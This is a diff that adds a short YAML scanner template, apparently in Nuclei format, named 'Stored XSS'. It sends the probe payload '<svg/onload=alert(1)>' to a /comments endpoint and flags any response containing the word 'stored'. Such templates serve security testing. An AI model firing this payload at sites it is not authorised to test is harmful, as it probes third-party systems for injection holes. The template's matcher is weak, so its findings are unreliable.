@@ -1,0 +1,14 @@
+id: avvp-xss-xss-stored-11
+info:
+  author: avvp
+  name: Stored XSS
+  severity: high
+requests:
+- matchers:
+  - part: body
+    type: word
+    words:
+    - stored
+  method: GET
+  path:
+  - /comments?body=<svg/onload=alert(1)>
